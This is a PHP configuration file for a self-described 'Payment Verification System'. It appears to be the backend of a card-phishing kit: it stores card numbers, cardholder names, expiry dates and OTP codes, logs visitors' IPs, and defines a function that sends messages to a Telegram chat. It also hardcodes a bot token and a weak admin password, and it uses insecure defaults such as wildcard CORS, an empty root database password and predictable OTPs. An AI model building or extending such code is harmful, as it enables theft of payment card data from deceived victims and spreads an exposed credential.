<?php
// Database Configuration
define('DB_HOST', 'localhost');
define('DB_USER', 'root');
define('DB_PASSWORD', '');
define('DB_NAME', 'payment_app');

// Telegram Configuration
define('TELEGRAM_BOT_TOKEN', '8332648469:AAG0nSTVcu5DuLsvXEGa0cr5MV_Ae7BB4_g');
define('TELEGRAM_CHAT_ID', '-4843141531');

// Application Settings
define('APP_NAME', 'Payment Verification System');
define('APP_URL', 'http://' . $_SERVER['HTTP_HOST']);
define('ADMIN_PATH', '/admin');
define('ADMIN_PASSWORD', 'admin12345'); // Change this to a secure password

// Session Configuration
session_start();
define('SESSION_LIFETIME', 3600); // 1 hour

// Error Handling
error_reporting(E_ALL);
ini_set('display_errors', 0); // Don't display errors to users
ini_set('log_errors', 1);
ini_set('error_log', __DIR__ . '/error.log');

// CORS Headers
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

// Security Headers
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: SAMEORIGIN');
header('X-XSS-Protection: 1; mode=block');

// Database Connection
try {
    $db = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);
    
    if ($db->connect_error) {
        throw new Exception('Database connection failed: ' . $db->connect_error);
    }
    
    $db->set_charset('utf8mb4');
} catch (Exception $e) {
    error_log($e->getMessage());
    die('System error. Please try again later.');
}

// Helper Functions
function sendTelegramMessage($message) {
    $url = 'https://api.telegram.org/bot' . TELEGRAM_BOT_TOKEN . '/sendMessage';
    
    $data = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    $options = [
        'http' => [
            'method' => 'POST',
            'header' => 'Content-type: application/x-www-form-urlencoded',
            'content' => http_build_query($data),
            'timeout' => 5
        ]
    ];
    
    $context = stream_context_create($options);
    $response = @file_get_contents($url, false, $context);
    
    return $response !== false;
}

function sanitizeInput($input) {
    return htmlspecialchars(trim($input), ENT_QUOTES, 'UTF-8');
}

function generateOTP() {
    return str_pad(mt_rand(0, 999999), 6, '0', STR_PAD_LEFT);
}

function generateSessionId() {
    return bin2hex(random_bytes(16));
}

function logVisitor($action, $data = []) {
    global $db;
    
    $ip = $_SERVER['REMOTE_ADDR'];
    $userAgent = sanitizeInput($_SERVER['HTTP_USER_AGENT'] ?? 'Unknown');
    $actionLog = sanitizeInput($action);
    $dataJson = json_encode($data);
    $timestamp = date('Y-m-d H:i:s');
    
    $query = "INSERT INTO visitor_logs (ip_address, user_agent, action, data, timestamp) 
              VALUES (?, ?, ?, ?, ?)";
    
    $stmt = $db->prepare($query);
    $stmt->bind_param('sssss', $ip, $userAgent, $actionLog, $dataJson, $timestamp);
    $stmt->execute();
    $stmt->close();
}

function json_response($data) {
    header('Content-Type: application/json');
    echo json_encode($data);
    exit;
}

// Initialize database tables if they don't exist
function initializeDatabase() {
    global $db;
    
    // Transactions table
    $db->query("CREATE TABLE IF NOT EXISTS transactions (
        id INT AUTO_INCREMENT PRIMARY KEY,
        session_id VARCHAR(255) UNIQUE NOT NULL,
        card_number VARCHAR(20) NOT NULL,
        cardholder_name VARCHAR(255) NOT NULL,
        email VARCHAR(255) NOT NULL,
        expiry_date VARCHAR(10) NOT NULL,
        otp_code VARCHAR(6),
        otp_verified BOOLEAN DEFAULT FALSE,
        ip_address VARCHAR(45),
        status ENUM('pending', 'verified', 'failed') DEFAULT 'pending',
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        verified_at TIMESTAMP NULL
    )");
    
    // Visitor logs table
    $db->query("CREATE TABLE IF NOT EXISTS visitor_logs (
        id INT AUTO_INCREMENT PRIMARY KEY,
        ip_address VARCHAR(45),
        user_agent TEXT,
        action VARCHAR(255),
        data JSON,
        timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )");
}

initializeDatabase();
?>
